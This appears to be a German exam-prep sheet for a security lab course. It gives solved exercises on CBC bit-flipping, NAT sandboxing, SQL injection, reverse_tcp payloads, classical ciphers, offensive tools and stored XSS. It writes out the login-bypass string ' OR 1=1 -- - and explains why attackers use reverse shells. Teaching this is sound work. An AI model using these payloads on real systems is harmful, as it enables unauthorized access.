> **✅** Der Angreifer braucht **Klartext und zugehörigen Geheimtext** (nicht den Schlüssel). Weil CBC die Blöcke per XOR verkettet, kann man durch Ändern eines Chiffreblocks den **nächsten** entschlüsselten Block gezielt verändern (der eigene Block wird dabei zerstört). Praktisch gegen **LUKS**-Partitionen genutzt → zeigt: CBC schützt **Vertraulichkeit**, aber ohne zusätzlichen Schutz **nicht die Integrität** (dafür MAC/authentifizierte Verschlüsselung).

---

# Aufgaben — типичные [T] / перенос [N]
Решения сразу под задачей.

**A1 [T]. Warum verwendet das Praktikum ein NAT-Netzwerk und nicht „Netzwerkbrücke"?**
> **✅ Lösung:** Das **NAT-Netzwerk** erlaubt Kommunikation **Gast↔Gast** und **Gast→Internet**, verhindert aber **Gast→Host** → der echte Rechner (Host) bleibt vor den absichtlich verwundbaren VMs geschützt (Sandboxing). Eine **Netzwerkbrücke** würde die VMs direkt ins echte LAN hängen und Host/andere Rechner gefährden.

**A2 [T]. `' OR 1=1 -- -` als Nutzername loggt ohne Passwort ein. Erklären Sie warum.**
> **✅ Lösung:** Die Eingabe wird ungeprüft in `… WHERE username='$u' …` eingesetzt → `… WHERE username='' OR 1=1; -- -'`. `OR 1=1` ist **immer wahr** (Tautologie), `-- -` kommentiert den Rest der Abfrage (die Passwortprüfung) aus → die erste Zeile (admin) wird zurückgegeben. Ursache: fehlende Eingabeprüfung; Schutz: **Prepared Statements**.

**A3 [T]. Was ist der Unterschied zwischen Deep Web und Dark Web?**
> **✅ Lösung:** **Deep Web** = alle Inhalte, die **nicht von Suchmaschinen indexiert** sind und meist Login/Passwort brauchen (Onlinebanking, E-Mail) — der **größte** Teil des Netzes, ganz alltäglich. **Dark Web** = ein **kleiner**, verborgener Teil, erreichbar **nur über ein Darknet** (z. B. TOR) und spezielle Software (`.onion`). Zusatz: **Darknet** = die Infrastruktur, **Dark Web** = die Inhalte darauf.

**A4 [T]. Warum reverse_tcp statt bind_tcp beim Android-Payload?**
> **✅ Lösung:** Bei **reverse_tcp** verbindet sich das **Opfer zum Angreifer** → man muss die (veränderliche, oft hinter NAT liegende) IP des Smartphones nicht kennen, und Firewalls, die nur eingehende Verbindungen blocken, werden umgangen. Bei **bind_tcp** öffnet das Opfer einen Port — den könnten auch Dritte finden, und Firewalls blocken eingehende Verbindungen oft.

**A5 [T]. Caesar-Chiffre: Warum ist sie trivial zu brechen, Vigenère aber nicht mit einfacher Häufigkeitsanalyse?**
> **✅ Lösung:** Caesar ist **monoalphabetisch** — jeder Klartextbuchstabe wird **immer** gleich abgebildet, also verrät die Buchstabenhäufigkeit sofort die Verschiebung (oder man testet alle 25 Schlüssel per Brute-Force). Vigenère ist **polyalphabetisch** — durch das wiederholte Schlüsselwort wird derselbe Buchstabe je nach Position **unterschiedlich** chiffriert, was die Häufigkeitsverteilung verwischt. Man muss erst die **Schlüssellänge** bestimmen.

**A6 [N] 🧮. Entschlüsseln Sie den Caesar-Text `KHOOR` mit k=3.**
> **✅ Lösung:** Jeden Buchstaben um 3 **zurück**: K→H, H→E, O→L, O→L, R→O → **HELLO**.

**A7 [N]. Ordnen Sie Werkzeug → Zweck:** arpspoof · SET · sqlmap · nikto · nmap · msfvenom · apktool · CrypTool
> **✅ Lösung:** arpspoof → ARP-Spoofing/MitM · SET → Phishing (Seiten klonen, Credential Harvester) · sqlmap → automatisierte SQL-Injection · nikto → Webserver-Schwachstellenscan · nmap → Port-/Netzwerkscan + OS-Erkennung · msfvenom → Payload (Schadcode) erzeugen · apktool → APK dekompilieren (→ Smali) · CrypTool → klassische Chiffren lernen/brechen.

**A8 [T]. Welches Schutzziel verletzt die stored-XSS im Gästebuch, und warum reicht die `maxlength`-Prüfung nicht?**
> **✅ Lösung:** Primär **Integrität** der Seite (fremder Code verändert sie) und je nach Payload **Vertraulichkeit** (Session-/Nutzerdaten-Diebstahl). `maxlength="50"` ist nur **clientseitig** im HTML gesetzt und über die Browser-Entwicklerwerkzeuge entfernbar → es braucht **serverseitige** Validierung und **Output-Encoding**.
